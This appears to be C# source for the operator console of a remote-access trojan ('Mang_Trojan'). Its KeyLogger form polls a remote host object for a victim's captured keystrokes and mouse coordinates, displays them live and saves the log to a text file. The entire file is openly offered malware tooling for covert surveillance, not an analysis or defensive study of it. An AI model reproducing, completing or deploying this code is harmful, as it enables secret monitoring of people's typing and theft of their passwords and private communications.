using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
namespace Mang_Trojan.form
{
    public partial class KeyLogger : Form
    {
        RemoteObject.ScreenObject hostInstance;
        Point mouseXY;
        public KeyLogger(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

            if (!backgroundWorker1.IsBusy)
            {
                backgroundWorker1.RunWorkerAsync();
            }
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                if (hostInstance != null)
                {
                    List<string> tests = hostInstance.getKey();
                    foreach (string test in tests)
                    {
                        updateText(tbKeylog, test +"\t");
                    }

                    hostInstance.GetMouseLocation(out mouseXY);
                    string test2 = mouseXY.X.ToString();

                    updateContinuesText(lbX,mouseXY.X.ToString());
                    updateContinuesText(lbY, mouseXY.Y.ToString());
                }
            }
            catch (Exception ex)
            {
                if (backgroundWorker1.IsBusy)
                { backgroundWorker1.Dispose(); }
               
            }
        }
        private delegate void textDelegate(Control cntrl, string value);
        private void updateText(Control cntrl, string value)
        {
            if (cntrl.InvokeRequired)
            { cntrl.Invoke(new textDelegate(updateText), new object[] { cntrl, value }); }
            else
            {
                cntrl.Text += value;
            }
        }

        private delegate void textContinuesDelegate(Control cntrl, string value);
        private void updateContinuesText(Control cntrl, string value)
        {
            if (cntrl.InvokeRequired)
            { cntrl.Invoke(new textContinuesDelegate(updateContinuesText), new object[] { cntrl, value }); }
            else
            {
                cntrl.Text = value;
            }
        }

        private void btSave_Click(object sender, EventArgs e)
        {
            Stream myStream;
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter =
               "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            dialog.Title = "Chọn tập tin";
            
                if (dialog.ShowDialog() == DialogResult.OK&&dialog.FileName!=string.Empty)
                {
                    if ((myStream = dialog.OpenFile()) != null)
                    {   
                        StreamWriter wText = new StreamWriter(myStream);
                        wText.Flush();
                        wText.Write(tbKeylog.Text);
                        wText.Close();
                        myStream.Close();
                    }
                
                
            }

        }

        private void bttClear_Click(object sender, EventArgs e)
        {
            // updateText(tbKeylog, string.Empty);
            tbKeylog.Clear();
        }

    }
}
